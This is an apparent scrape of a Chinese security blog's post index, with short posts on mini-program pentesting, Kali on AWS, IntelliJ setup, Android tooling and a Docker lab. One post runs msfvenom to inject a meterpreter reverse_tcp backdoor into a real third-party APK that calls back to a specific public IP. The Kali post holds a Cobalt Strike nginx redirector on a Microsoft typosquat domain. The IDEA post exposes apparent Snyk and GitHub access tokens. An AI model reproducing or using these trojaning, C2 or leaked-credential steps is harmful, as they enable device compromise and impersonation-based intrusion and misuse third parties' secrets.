\u0026lt;hash\u0026gt;.0 # 将pem格式的证书重命名为 hash值.0    将证书 9a5ba575.0 移动到系统证书目录 /system/etc/security/cacerts\nadb push 9a5ba575.0 /sdcard/ # 推送到sdcard目录上 adb shell su mv /sdcard/9a5ba575.0 /system/etc/security/cacerts/ # 将证书移到此目录 chmod 644 /system/etc/security/cacerts/9a5ba575.0 # 设置权限 adb reboot # 重启生效    \n微信小程序渗透测试流程 \n获取微信小程序 Android 手机最近使用过的微信小程序所对应的 wxapkg 包文件都存储在特定文件夹下\n~ /data/data/com.tencent.mm/MicroMsg/{User}/appbrand/pkg/~\n{User} 为当前用户的用户名 315e07770f778822*********2bfee\nadb shell su rm /data/data/com.tencent.mm/MicroMsg/{User} # 先删除此目录,手机上点开待测的小程序后会重新生成此目录 原因：防止包含其他小程序 cp -R /data/data/com.tencent.mm/MicroMsg/{User}/appbrand/pkg /sdcard # 将小程序目录复制到/sdcard上 adb pull /sdcard/pkg ./ # 将小程序拷贝到本地当前目录  \n下载反编译工具 wxappUnpacker 并反编译小程序   下载反编译工具\ngit clone git@github.com:askDing/wxappUnpacker.git cd wxappUnpacker ./install.sh -npm # 安装npm和node ./install.sh # 安装依赖    解包操作\n./de_miniapp.sh -d path/to/xxx.wxapkg # 解某个小程序 ./de_miniapp.sh /path/to/pkg # 解pkg目录下所有的小程序  微信小程序项目目录结构介绍\n├── app.js 注册小程序，绑定生命周期回调函数、错误监听和页面不存在监听函数等 ├── app.json 小程序全局配置，决定页面文件的路径、窗口表现、设置网络超时时间、设置多tab等 ├── app.wxss 小程序公共样式表 ├── pages 存放小程序各个页面信息 │ │── index │ │ ├── index.wxml 必须 页面构造类似html文件 │ │ ├── index.js 必须 对页面进行注册，指定页面的初始数据、生命周期回调、事件处理函数等 │ │ ├── index.json 页面窗口配置 │ │ └── index.wxss 页面样式表相当css文件 │ └── logs │ ├── logs.wxml │ └── logs.js └── utils 放置一些公用的方法 │ └── sitemap.json 配置小程序及其页面是否允许被微信索引 │ └── project.config.json 小程序项目配置文件 ------------------------------------------------------- ├─cloud-functions ---云函数 │ └─setCrypto ---数据加密模块，用户加密一些数据 │ index.js │ package.json │ ... │ ... │ ├─components ---小程序自定义组件 │ ├─plugins --- （重点）可独立运行的大型模块，可以打包成plugins │ │ ├─comment ---评论模块 │ │ │ │ index.js │ │ │ │ index.json │ │ │ │ index.wxml │ │ │ │ index.wxss │ │ │ │ services.js ---（重点）用来处理和清洗数据的service.js，配套模板和插件 │ │ │ │ │ │ │ └─submit ---评论模块子模块：提交评论 │ │ │ index.js │ │ │ index.json │ │ │ index.wxml │ │ │ index.wxss │ │ │ │ │ └─canvasPoster ---canvas海报生成模块 │ │ index.js │ │ index.json │ │ index.wxml │ │ index.wxss │ │ services.js ---（重点）用来处理和清洗数据的service.js，配套模板和插件 │ │ │ └─templates ---（重点）模板，通过外部传参的容器，不做过多的数据处理 │ │ │ ├─slideshow ---滚屏切换模板 │ │ index.js │ │ index.json │ │ index.wxml │ │ index.wxss │ │ service.js ---（重点）用来处理和清洗数据的service.js，配套模板和插件 │ │ │ └─works ---作品模板 │ │ index.js │ │ index.json │ │ index.wxml │ │ index.wxss │ │ service.js │ │ │ ├─articlePlugin ---作品模板中的文章类型 │ │ index.js │ │ index.json │ │ index.wxml │ │ index.wxss │ │ │ ├─galleryPlugin ---作品模板中的九宫格类型 │ │ index.js │ │ index.json │ │ index.wxml │ │ index.wxss      \n代码审计，找出所有API进行测试   查看 xxx.json 文件匹配URI(html页面）\n{ \u0026quot;subPackages\u0026quot;: [ { \u0026quot;root\u0026quot;: \u0026quot;pages/pageNews/\u0026quot;, \u0026quot;pages\u0026quot;: [ \u0026quot;pages/pageNews/news/notice/index\u0026quot;, \u0026quot;pages/pageNews/news/details\u0026quot;, ] }, { \u0026quot;root\u0026quot;: \u0026quot;pages/pageRetail/\u0026quot;, \u0026quot;pages\u0026quot;: [ \u0026quot;pages/pageRetail/companys/company/company\u0026quot;, \u0026quot;pages/pageRetail/companys/companyAdd/companyAdd\u0026quot;, \u0026quot;pages/pageRetail/lsms/fghxq\u0026quot; ] }, ] }    查看 xxx.js 文件，搜索 module.exports,找出域名和API接口,进行测试\n(function (module, exports, __webpack_require__) { \u0026quot;use strict\u0026quot;; var httpUrl = { //本地环境 //baseUrl:'http://127.0.0.1:8001/app_name/', //baseysts:'http://127.0.0.1:8004/' //开发环境 //baseUrl:'http://192.168.1.199:8001/app_name/', //baseysts:'http://192.168.1.199:8004/' //安评环境 //baseUrl:'http://10.150.86.125:8001/app_name/', //baseysts:'http://10.150.86.125:8004/' //正式环境 baseUrl: 'https://xx.xx.xx.xx/app_name/' }; module.exports = httpUrl; /***/ }) (function (module, exports, __webpack_require__) { \u0026quot;use strict\u0026quot;; //const base = \u0026quot;http://192.168.1.199:7120/\u0026quot; var bases = __webpack_require__(/*! ./https */ \u0026quot;./src/config/https.js\u0026quot;); var base = bases.baseUrl; var baseyst = bases.baseysts; module.exports = { newsLists: base + 'appnews/news/list', //资讯列表 newsDetails: base + 'appnews/news/detail', tbsbqr: base + 'appsbs/refund/tbsbqr', queren: base + 'appsbs/refund/queren', .... gang_dong_geo: base + 'appbase/static/js/gang_dong_geo.json' //地图json }; })    References:\n 小程序开发官方文档 微信小程序开发指南  ","description":"","id":31,"section":"en","tags":[""],"title":"App渗透测试","uri":"http://crkmythical.github.io/en/blog/app%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"content":"编写进度\n   Table of Contents  AWS部署Kali  创建EC2实例-镜像选择Kali linux 配置Elastic IP 登录VPS 启用Root用户,删除kali用户 配置SSH服务,启用证书登录 更新系统 部署Guacamole服务  部署XRDP服务 设置mariadb数据库root的密码 部署Guacamole服务 check相关服务是否开启   配置Guacamole服务  配置本地ssh config文件 访问 http://localhost:18080/guacamole     站点伪造  \nAWS部署Kali \n创建EC2实例-镜像选择Kali linux aws-kali部署\n\n配置Elastic IP 配置Elastic IP\n\n登录VPS ssh -i ~/.ssh/ed25519_crkmyth1cal kali@54.199.157.235  \n启用Root用户,删除kali用户 sudo passwd root # 设置root的密码 su root # 切换root用户 cp /home/kali/.ssh/authorized_keys /root/.ssh ; exit ssh -i ~/.ssh/ed25519_crkmyth1cal root@54.199.157.235 userdel -r kali # 删除用户kali  \n配置SSH服务,启用证书登录 sed -i \u0026quot;s/#Port.*/Port 22222/g\u0026quot; /etc/ssh/sshd_config # 修改端口为22222,需修改安全组,开放22222端口 sed -i \u0026quot;s/#PermitRootLogin.*/PermitRootLogin yes/g\u0026quot; /etc/ssh/sshd_config # 允许root登陆 sed -i \u0026quot;s/^PasswordAuthentication.*/PasswordAuthentication no/g\u0026quot; /etc/ssh/sshd_config # 关闭密码认证 sed -i \u0026quot;s/#PubkeyAuthent.*/PubkeyAuthentication yes/g\u0026quot; /etc/ssh/sshd_config # 启用公钥认证 sed -i \u0026quot;s/^#AuthorizedKeysFile.*/AuthorizedKeysFile .ssh/authorized_keys/g\u0026quot; /etc/ssh/sshd_config # 启用authorized_keys文件 sed -i \u0026quot;s/^GSSAPIAuthentication.*/GSSAPIAuthentication no/\u0026quot; /etc/ssh/sshd_config sed -i \u0026quot;s/^UseDNS.*/UseDNS no/g\u0026quot; /etc/ssh/sshd_config # Optional sed -i \u0026quot;s/^StrictModes.*/StrictModes yes/g\u0026quot; /etc/ssh/sshd_config # 严格模式，校验相关目录权限 sed -i \u0026quot;s/#AllowTcpFor.*/AllowTcpForwarding yes/g\u0026quot; /etc/ssh/sshd_config # 启用tcp转发 sed -i \u0026quot;s/#X11Forward.*/X11Forwarding yes/g\u0026quot; /etc/ssh/sshd_config # 启用X11转发 sed -i \u0026quot;s/#X11DisplayOffset.*/X11DisplayOffset 10/g\u0026quot; /etc/ssh/sshd_config # 启用X11转发 sed -i \u0026quot;s/#TCPKeepAlive yes/TCPKeepAlive yes/g\u0026quot; /etc/ssh/sshd_config # 防止死连接 # 开机自启 systemctl enable ssh \u0026amp;\u0026amp; systemctl restart ssh  \n更新系统 apt update \u0026amp;\u0026amp; apt full-upgrade -y \u0026amp;\u0026amp; reboot -f apt install -y linux-headers-`uname -r` nvidia-driver nvidia-cuda-toolkit tasksel # 安装组件-xfce桌面 apt autoremove \u0026amp;\u0026amp; apt autoclean \u0026amp;\u0026amp; reboot -f  \n部署Guacamole服务 \n部署XRDP服务 port=tcp://.:3390\napt install -y kali-desktop-xfce xrdp # 安装xrdp sed -i 's/port=3389/port=tcp://.:3390/g' /etc/xrdp/xrdp.ini # 修改xrdp默认端口,仅本地访问 systemctl enable xrdp --now # 设置开机自启动 systemctl start xrdp # 启动xrdp服务  \n设置mariadb数据库root的密码 参考https://cloud.tencent.com/developer/article/1512334\nsystemctl enable mysql # 设置开机自启动 systemctl restart mysql # 启动mysql服务 mysql -u root # 连接mysql MariaDB [(none)]\u0026gt; use mysql; # 切换到mysql数据库 MariaDB [mysql]\u0026gt; SET password=PASSWORD('root'); # 更改root用户密码为root MariaDB [mysql]\u0026gt; FLUSH PRIVILEGES; # 立即生效,无需重启 exit; # 断开mysql  \n部署Guacamole服务 guacamole配置目录\ntree -l /etc/guacamole 127 ⨯ /etc/guacamole ├── extensions │ ├── guacamole-auth-jdbc-mysql-1.4.0.jar │ └── guacamole-auth-totp-1.4.0.jar ├── guacamole.properties ├── guacamole.war ├── guacd.conf └── lib └── mysql-connector-java.jar 2 directories, 6 files    Apache 存在一个错误，它不会将 EDT 视为有效时区。建议修改时区\nln -sf /usr/share/zoneinfo/US/Central /etc/localtime    guac-install编译时需添加 --disable-guacenc 参数原因,否则会报错\n./configure --with-systemd-dir=/etc/systemd/system --disable-guacenc \u0026amp;\u0026gt;\u0026gt; ${LOG}\ngit clone https://github.com/MysticRyuujin/guac-install.git /tmp/guac-install \u0026amp;\u0026amp; cd /tmp/guac-install/ ./guac-install.sh --totp --nomysql --mysqlhost localhost --mysqlport 3306 --mysqlpwd root --guacpwd guacadmin # 其他参数默认即可,一路回车 Enter Guacamole database name [guacamole_db]: Enter Guacamole user [guacamole_user]: Read MySQL root's password from command line argument Read MySQL guacamole_user's password from command line argument Updating apt... Found libmariadb-java package (known issues). Will download libmysql-java 8.0.27 and install manually Found tomcat9 package... Installing packages. This might take a few minutes... OK Downloading files... guacamole-server-1.4.0.tar.gz 100%[===========================================================\u0026gt;] 1.05M --.-KB/s in 0.02s Downloaded guacamole-server-1.4.0.tar.gz guacamole-1.4.0.war 100%[===========================================================\u0026gt;] 12.41M --.-KB/s in 0.05s Downloaded guacamole-1.4.0.war guacamole-auth-jdbc-1.4.0.tar.gz 100%[===========================================================\u0026gt;] 15.72M --.-KB/s in 0.1s Downloaded guacamole-auth-jdbc-1.4.0.tar.gz guacamole-auth-totp-1.4.0.tar.gz 100%[===========================================================\u0026gt;] 4.55M --.-KB/s in 0.07s Downloaded guacamole-auth-totp-1.4.0.tar.gz mysql-connector-java-8.0.27.tar.g 100%[===========================================================\u0026gt;] 4.02M --.-KB/s in 0.06s Downloaded mysql-connector-java-8.0.27.tar.gz Downloading complete. Building Guacamole-Server with GCC 11.2.0 Configuring Guacamole-Server. This might take a minute... OK Running Make on Guacamole-Server. This might take a few minutes... OK Running Make Install on Guacamole-Server... OK Moving mysql-connector-java-8.0.27.jar (/etc/guacamole/lib/mysql-connector-java.jar)... Moving guacamole-auth-totp-1.4.0.jar (/etc/guacamole/extensions/)... Restarting Tomcat service \u0026amp; enable at boot... OK Created symlink /etc/systemd/system/multi-user.target.wants/tomcat9.service → /lib/systemd/system/tomcat9.service. Checking MySQL for existing database (guacamole_db) OK Checking MySQL for existing user (guacamole_user) OK Adding database tables... OK Create guacd.conf file... Starting guacd service \u0026amp; enable at boot... Created symlink /etc/systemd/system/multi-user.target.wants/guacd.service → /etc/systemd/system/guacd.service. Cleanup install files... Installation Complete - Visit: http://localhost:8080/guacamole/ - Default login (username/password): guacadmin/guacadmin ***Be sure to change the password***.    tomcat加固\ntomcat9配置文件 /etc/tomcat9/server.xml\n  修改tomcat9服务端口\n\u0026lt;Connector port=\u0026quot;68080\u0026quot; protocol=\u0026quot;HTTP/1.1\u0026quot; connectionTimeout=\u0026quot;20000\u0026quot; redirectPort=\u0026quot;8443\u0026quot; /\u0026gt;    限定来源IP\n在 \u0026lt;Host 标签下新增如下配置\n\u0026lt;Valve className=\u0026quot;org.apache.catalina.valves.RemoteAddrValve\u0026quot; allow=\u0026quot;127\\.\\d+\\.\\d+\\.\\d+|::1|0:0:0:0:0:0:0:1\u0026quot;/\u0026gt;      重启服务\nsystemctl restart tomcat9    \ncheck相关服务是否开启 systemctl status tomcat9 guacd mariadb xrdp netstat -antlp| grep \u0026quot;guacd\\|mariadbd\\|xrdp*\\|java\u0026quot; tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN 1089/mariadbd tcp 0 0 0.0.0.0:4822 0.0.0.0:* LISTEN 40005/guacd tcp 0 0 127.0.0.1:3306 127.0.0.1:49114 ESTABLISHED 1089/mariadbd tcp6 0 0 :::3390 :::* LISTEN 40649/xrdp tcp6 0 0 :::18080 :::* LISTEN 41714/java tcp6 0 0 ::1:3350 :::* LISTEN 40639/xrdp-sesman tcp6 0 0 127.0.0.1:49114 127.0.0.1:3306 ESTABLISHED 41714/java  \n配置Guacamole服务 \n配置本地ssh config文件 cat \u0026gt;\u0026gt; ~/.ssh/config \u0026lt;\u0026lt;EOF heredoc\u0026gt; Host kali heredoc\u0026gt; User root heredoc\u0026gt; Port 22222 heredoc\u0026gt; IdentityFile ~/.ssh/ed25519_crkmyth1cal heredoc\u0026gt; LocalForward 68080 localhost:68080 heredoc\u0026gt; EOF  \n访问 http://localhost:18080/guacamole 可选:创建新管理员用户，删除原来用户\n  创建新建连接\nnew-connection\n  \n站点伪造 server { listen 80 ; server_name support.micorsoft.cn; #subdomain.your_main_domain.com; # Scripted Web Delivery(S) location ~* /a { # URI Path : like axxx (prefix with a) # Local Host : subdomain.domain.com # Local Port : 60080 (Note: **Beacon-HTTP Listener Port bindto 60080**) # Listener : Beacon-https-port(Beacon Type is https) # Type : powershell e.t.c what you like # x64 : toggle it in common # SSL : toggle it in comoon proxy_pass https://127.0.0.1:443; #\tproxy_set_header Host $http_host; #\tproxy_set_header X-Real-IP $remote_addr; #\tproxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } # Beacon Communication location ~* /jquery { if ($http_user_agent != \u0026quot;Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\u0026quot;) { return 301 https://support.microsoft.com$request_uri ; } # Lisenter Settings # Name : like https-\u0026lt;port\u0026gt; just for remember # Payload : Beacon HTTPS # # HTTP Host: subdomain.domain.cn # or cdn ip # # # Host Rotation Strategy : default # HTTPS Host(Stager) : subdomain.your_main_domain.cn # Profile : # HTTP Port(C2) : 8443 this port is nginx proxy_pass to as follow # HTTPS Port(Bind) : # HTTPS Host Header : subdomain.your_main_domain.cn # HTTP Proxy : proxy_pass http://127.0.0.1:808; } location = / { # defautl to access to index redirect to support.microsoft.com return 302 https://support.microsoft.com$request_uri ; } }  ","description":"","id":32,"section":"en","tags":null,"title":"如何在AWS上部署kali","uri":"http://crkmythical.github.io/en/blog/%E5%A6%82%E4%BD%95%E5%9C%A8aws%E4%B8%8A%E9%83%A8%E7%BD%B2kali/"},{"content":"编写进度\n   IntelJ Idea 教程 https://github.com/judasn/IntelliJ-IDEA-Tutorial\n1  brew install --cask intellij-idea   激活 Settings Import/Export  导出配置   IDEA 偏好设置 全局配置打开偏好设置\nAppearance \u0026amp; Behavior System Settings Keymap 常用快捷键    Ctrl+h 查看当前类的层次结构      Command+7 查看类结构    Command+O 快速搜索类    Command +F 关键字检索(当前文件) 全局 Command+Shift+F   Command+Alt +B 查看方法/类的实现类    Alt + F7 查看调用链(方法被调用的情况) Find Usages   Command+E 查看最近使用的文件    Shift+ Alt+Command+U 查看可视化类继承链    Command+/ 行注释 Shift+Command+/ 块注释   /** 方法/类注释 可自定义类模板    可视化类继承链\nEditor Editor-\u0026gt;General   自动导入\n  Appearnace\n  Code Completion  Editor Tabs  Postfix Completion var声明 null判空 notnull判非空 nn判非空 for遍历 fori带索引的遍历 not取反 if条件判断 cast强转 return返回值 Editro-\u0026gt;Code Editing Font Color Scheme Code Style Inspections File and Code Templates  File Header    Class\n  Interface\n  Enum\n  File Encodings BOM（byte-order mark），即字节顺序标记，它是插入到以UTF-8、UTF16或UTF-32编码Unicode文件开s头的特殊标记，用来识别Unicode文件的编码类型。对于UTF-8来说，BOM并不是必须的，因为BOM用来标记多字节编码文件的编码类型和字节顺序（big-endian或little-endian）。\n　不含BOM的UTF-8才是标准形式，UTF-8不需要BOM\n带BOM的UTF-8文件的开头会有U+FEFF，所以我新建的空文件会有3字节的大小。\nLive Templates File Types 隐藏项目中 .idea目录\nInlay Hints -Java Copyright Plugins 常用插件 Theme - Nord / One Dark / Xcode-Dark Dash Edutool Stackoverflow 时序图-SequenceDigram 项目代码统计 Statistic 快捷键展示Presentation Assistant 阿里巴巴 Java 代码规范- Alibaba Java Code Guidelines MybatisX 高效操作Mybatis插件 Mybatis-log-plugin Codota— 代码智能提示 必备的翻译插件-Translation GitToolBox-显示代码提交时间 Key Promoter X 快捷键提示插件 Rainbow Brackets ——让你的括号变成不一样的颜色，防止错乱括号 Leetcode Editor 可以在IDEA中在线刷题。 Java Stream Debugger —— Stream 将操作步骤可视化 Insomnia-防止休眠 安全插件 SpotBugs https://github.com/find-sec-bugs/find-sec-bugs/wiki/IntelliJ-Tutorial\nBlack Duck SCA WhiteSource Advise Momo Code Sec Inspector Java Decompiler(JD-GUI) Jadx Android Decompiler Snyk CMD模式 1 2  brew tap snyk/tap \u0026amp;\u0026amp; brew install snyk snyk config set api c70b7d5a-1a74-44df-b52c-3ab5c80d12e6   IDE模式 先配置JAVA_HOME\n1 2 3 4 5 6  echo \u0026#39; ## JDK export JAVA_HOME=/Library/Java/JavaVirtualMachines/zulu-8.jdk/Contents/Home export PATH=$JAVA_HOME/bin:$PATH \u0026#39; \u0026gt;\u0026gt; ~/.zshrc   jclasslib bytecode viewer 查看字节码 Jadx Android Decompiler RIPS Security Analysis RestfulTool—— 快捷跳转Action方法  snyk SonarLint 代码质量检查插件 Version Control 与Gitlab集成 Build, Excution,Deployment Maven Compiler Debug 当调用ConcurrentLinkedQueue类的toString()方法时会获取队列的迭代器，而创建迭代器时会调用队列的first()方法，在first()方法里会修改head的属性，从而导致输出的结果不一致\n在远程调试时，我们发现有些类的断点一直断不上问题，该问题可能出在 IntelliJ 的 Settings -\u0026gt; Debugger -\u0026gt; Stepping 配置上。若勾选了 Do not step into the classes，则会让这些断点失效:\n本地调试 远程调试 对第三方jar包进行调试   创建工程，将jar包添加到依赖库中\n  在Main函数处打断点，添加调试配置，运行程序，点击debug\n  Language \u0026amp; Frameworks Tools Setting Repository- 使用git仓库保存Idea配置文件Settings Access-Token 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\nAdvanced Settings Other Settings 代码对比效果图\n","description":"","id":33,"section":"en","tags":null,"title":"IDEA使用教程","uri":"http://crkmythical.github.io/en/blog/idea%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"},{"content":"编写进度\n   aptkool\n利用msf框架对安卓手机进行简单操作\n渗透安卓\n 环境准备\n1. brew install --cask android-sdk \u0026amp;\u0026amp; brew install apktool\n2. sdkmanager \u0026quot;platform-tools\u0026quot; \u0026quot;build-tools;28.0.3\u0026quot; \u0026quot;platforms;android-28\u0026quot;  安装zipalign\n3. export PATH=$PATH:/usr/local/Caskroom/android-sdk/4333796/build-tools/28.0.3 配置zipalign\n4. 制作APK  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  msfvenom --platform android -x Desktop/jihu.jihuapp_2.7.12_20712.apk -p android/meterpreter/reverse_tcp lhost=101.132.34.104 lport=19003 -o Desktop/jihu_evil.apk Using APK template: Desktop/jihu.jihuapp_2.7.12_20712.apk [-] No arch selected, selecting arch: dalvik from the payload [*] Creating signing key and keystore.. [*] Decompiling original APK.. [*] Decompiling payload APK.. [*] Locating hook point.. [*] Adding payload as package jihu.jihuapp.glfku [*] Loading /var/folders/v6/g93y9wqj229_s53gx3yp67q00000gn/T/d20210816-2205-4bcwjl/original/smali_classes4/jihu/jihuapp/MainActivity.smali and injecting payload.. [*] Poisoning the manifest with meterpreter permissions.. [*] Adding \u0026lt;uses-permission android:name=\u0026#34;android.permission.WRITE_SETTINGS\u0026#34;/\u0026gt; [*] Adding \u0026lt;uses-permission android:name=\u0026#34;android.permission.RECEIVE_SMS\u0026#34;/\u0026gt; [*] Adding \u0026lt;uses-permission android:name=\u0026#34;android.permission.WRITE_CONTACTS\u0026#34;/\u0026gt; [*] Adding \u0026lt;uses-permission android:name=\u0026#34;android.permission.SEND_SMS\u0026#34;/\u0026gt; [*] Adding \u0026lt;uses-permission android:name=\u0026#34;android.permission.READ_CALL_LOG\u0026#34;/\u0026gt; [*] Adding \u0026lt;uses-permission android:name=\u0026#34;android.permission.CALL_PHONE\u0026#34;/\u0026gt; [*] Adding \u0026lt;uses-permission android:name=\u0026#34;android.permission.WRITE_CALL_LOG\u0026#34;/\u0026gt; [*] Adding \u0026lt;uses-permission android:name=\u0026#34;android.permission.READ_CONTACTS\u0026#34;/\u0026gt; [*] Adding \u0026lt;uses-permission android:name=\u0026#34;android.permission.READ_SMS\u0026#34;/\u0026gt; [*] Adding \u0026lt;uses-permission android:name=\u0026#34;android.permission.SET_WALLPAPER\u0026#34;/\u0026gt; [*] Adding \u0026lt;uses-permission android:name=\u0026#34;android.permission.CHANGE_WIFI_STATE\u0026#34;/\u0026gt; [*] Adding \u0026lt;uses-permission android:name=\u0026#34;android.permission.RECEIVE_BOOT_COMPLETED\u0026#34;/\u0026gt; [*] Rebuilding apk with meterpreter injection as /var/folders/v6/g93y9wqj229_s53gx3yp67q00000gn/T/d20210816-2205-4bcwjl/output.apk [*] Signing /var/folders/v6/g93y9wqj229_s53gx3yp67q00000gn/T/d20210816-2205-4bcwjl/output.apk [*] Aligning /var/folders/v6/g93y9wqj229_s53gx3yp67q00000gn/T/d20210816-2205-4bcwjl/output.apk Payload size: 23173289 bytes Saved as: Desktop/jihu_evil.apk   3 监听\n1  handler -H 101.132.34.104 -P 19003 -p android/meterpreter/reverse_tcp   ","description":"","id":34,"section":"en","tags":null,"title":"利用msf框架对安卓手机进行简单操作","uri":"http://crkmythical.github.io/en/blog/%E5%88%A9%E7%94%A8msf%E6%A1%86%E6%9E%B6%E5%AF%B9%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E8%BF%9B%E8%A1%8C%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/"},{"content":"编写进度\n   Oracle JDK_8 jdk-8u291-linux-x64.tar.gz\n1 2 3 4 5 6  tar -x -C /opt/jdk -f jdk-8u66-linux-x64.tar.gz # 解压jdk到/opt/jdk目录 update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_291/bin/java 100 update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_291/bin/javac 100 update-alternatives --remove java /opt/jdk1.8.0_291/bin/java update-alternatives --remove javac /opt/jdk1.8.0_291/bin/java   ","description":"","id":35,"section":"en","tags":null,"title":"linux上多版本JDK该如何管理","uri":"http://crkmythical.github.io/en/blog/linux%E4%B8%8A%E5%A4%9A%E7%89%88%E6%9C%ACjdk%E8%AF%A5%E5%A6%82%E4%BD%95%E7%AE%A1%E7%90%86/"},{"content":"编写进度\n   搭建Android程序分析环境 常见逆向分析工具  Adnroid Studio  1  brew install --cask android-studio # 安装Adnroid Studio    apktool  1  brew install apktool # 提供反编译与回编译功能    smali/baksmail  1  brew install smali # dex文件的反编译与回编译工具    dex2jar \u0026amp; jd-gui  1 2  brew install dex2jar # 将dex文件转成jar包 brew install --cask jd-gui # 查看jar包源码    jadx  1  brew install jadx # 将.dex/.jar/.class反编译成.java    010 Editor  1  brew install --cask 010-editor # 二进制编辑器     JEB\n  Androguard\n  集成工具 Android-Crack-Tool\n  Android-Killer\n  APKiD\n  编译Android源码 下载源码\n1 2  repo init -u https://android.googlesource.com/platform/manifest -b android-7.1.1_r1 repo sync --force-sync --force-broken   macOS下直接编译 需安装XCode命令行工具和macOS SDK\n1  xcode-select --install   编译Android源码\n1 2 3 4 5 6 7 8 9 10 11 12  export USE_CCACHE=1 mkdir ccache export CCACHE_DIR=ccache prebuilts //misc/darwin-x86/ccache/ccache -M 50G sudo xcode-select -s /Applications/Xcode.app/Content/Developer export JAVA_HOME=$(/usr/libexec/java_home -v 1.8) source build/envsetup.sh lunch aosp_angler-userdebug make clobber brew uninstall curl \u0026amp;\u0026amp; brew install curl --with-openssl export PATH=$(brew --prefix curl)/bin:$PATH caffeinate make -j8   在Docker中编译Android源码-推荐 1  brew install --cask docker docker-toolbox   打开Kitematic.app 搜索 aosp 选择4.4版，点击create\n下载后\n修改android源码和ccache缓存位置,\n重启\n执行 make -j4\n","description":"","id":36,"section":"en","tags":null,"title":"Android软件安全测试软件_mac平台","uri":"http://crkmythical.github.io/en/blog/android%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%BD%AF%E4%BB%B6-mac%E5%B9%B3%E5%8F%B0/"},{"content":"编写进度\n   基于docker的网络安全靶场搭建-主机篇\n 操作机-kali搭建  启动kali容器 安装基础环境包 生成镜像 kali-2021  推送镜像到DockerHub   远程桌面环境配置  使用新镜像生成容器并进入容器 更换Kali源 安装桌面环境相关服务 配置xrdp设置开机自启动     Web靶机制作  启动tomcat-mysql容器    操作机-kali搭建 启动kali容器 1 2 3 4 5 6 7  docker search kali # 搜索kali基础镜像 docker pull kalilinux/kali-rolling # 拉取基础镜像 docker images # 查看镜像 docker run -itd -p 3399:3389 kalilinux/kali-rolling /bin/bash # 后台运行容器 宿主3399映射到kali的3389 docker ps -a # 查看容器相关信息 docker attach \u0026lt;Container-ID\u0026gt; # 进入容器   安装基础环境包 1 2 3 4 5 6 7 8 9  apt-get -y update \u0026amp;\u0026amp; apt-get -y upgrade \u0026amp;\u0026amp; \\  DEBIAN_FRONTEND=noninteractive apt-get install -y \\  kali-tools-top10 \\  pciutils \\  vim \\  iputils-ping \\  bash-completion \u0026amp;\u0026amp; \\  apt-get autoremove -y \u0026amp;\u0026amp; \\  apt-get clean    DEBIAN_FRONTEND=noninteractive 取消交互，直接运行命令，而无需向用户请求输入 kali-tools-top10 kai常用工具 pciutils lspci工具 vim 文本编辑器 iputils-ping ping命令 bash-completion 命令自动补全  生成镜像 kali-2021 1 2  docker commit \u0026lt;Container-ID\u0026gt; \u0026lt;Image-Name\u0026gt; # 生成镜像 docker commit kali-2021 crkmyth1cal/kali20201:v1 # 可选，生成镜像并发布   推送镜像到DockerHub 1 2 3  docker login # 登陆docker docker push crkmyth1cal/kali20201:v1 # 推送镜像 docker logout # 退出docker   远程桌面环境配置 使用新镜像生成容器并进入容器 Ctrl+P+Q 退出容器不终止容器\n1 2 3 4  docker run -itd -p 3399:3389 kali-2021 # 后台运行容器，返回容器ID docker run -itd -p 3399:3389 -v /tmp/kevin:/data kali-2021 # 可选： 挂在本地文件 docker exec -it \u0026lt;ID\u0026gt; /bin/bash # 临时开启shell，退出时容器不停止 exec-running container run-new container docker start -a \u0026lt;ID\u0026gt; # 进入被Exited的容器   更换Kali源 1 2  echo \u0026#34;deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\u0026#34; | sudo tee /etc/apt/sources.list apt-get update   安装桌面环境相关服务 1 2  apt-get -y install kali-desktop-xfce xorg xrdp passwd root # 修改root密码    kali-desktop-xfce xfce桌面环境 xorg 是x11的实现，提供X server xrdp 远程桌面服务  配置xrdp设置开机自启动 1 2 3  sed -i \u0026#39;s/port=3399/port=3389/g\u0026#39; /etc/xrdp/xrdp.ini # 修改xrdp服务端口 service xrdp restart # 重启xrdp服务 update-rc.d xrdp enable # xrdp开机自启动   Web靶机制作 启动tomcat-mysql容器 1 2 3 4 5 6  docker search tomcat-mysql # 搜索tomcat-mysql镜像 docker pull aallam/tomcat-mysql # 下载tomcat-msyql镜像 docker run -d --name=\u0026#34;tomcat-mysql-run\u0026#34; \\  -e MYSQL_PASSWORD=root \\  -p 1306:3306 -p 1080:8080 aallam/tomcat-mysql # 后台启动，  docker exec –it ID /bin/bash # 进入tomcat-mysql   参考\n基于docker的网络安全靶场搭建-主机篇\n","description":"","id":37,"section":"en","tags":null,"title":"基于docker的网络安全靶场搭建-主机篇","uri":"http://crkmythical.github.io/en/blog/%E5%9F%BA%E4%BA%8Edocker%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA-%E4%B8%BB%E6%9C%BA%E7%AF%87/"},{"content":"编写进度\n   基础配置 第三方软件管理工具Homebrew    awesome-mac  基础优化脚本echo \u0026#39; #==============================================================# # System Preferences -\u0026gt; Sharing # #==============================================================# # forked on https://github.com/mathiasbynens/dotfiles/blob/main/.macos \u0026#39; xcode-select --install # 设置hostname #echo \u0026#39;----------\u0026gt; 配置《设置》-《共享》...\u0026#39; #read -p \u0026#34;Enter new hostname of the machine: \u0026#34; hostname #scutil --set HostName \u0026#34;$hostname\u0026#34; \u0026amp;\u0026amp; echo -e \u0026#34;Setting new hostname: $hostname ... \\033[32mDone!\\033[0m\u0026#34; # 设置computer name #compname=$(sudo scutil --get HostName | tr \u0026#39;-\u0026#39; \u0026#39;.\u0026#39;) #scutil --set ComputerName \u0026#34;$compname\u0026#34; \u0026amp;\u0026amp; echo -e \u0026#34;Setting new ComputerName: $compname ...\\033[32m 